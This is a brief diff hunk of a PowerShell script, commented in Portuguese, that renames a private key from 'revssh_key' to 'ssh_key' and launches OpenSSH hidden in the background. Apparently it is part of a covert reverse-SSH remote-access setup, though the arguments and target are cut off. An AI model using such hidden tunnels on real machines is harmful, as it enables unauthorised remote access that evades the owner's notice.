@@ -2,7 +2,7 @@
 $sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
 
 # Caminho da chave privada
-$keyPath = "C:\Users\testes\.ssh\revssh_key"
+$keyPath = "C:\Users\testes\.ssh\ssh_key"
 
 # Executa SSH em segundo plano invisível
 Start-Process -FilePath $sshPath -ArgumentList `
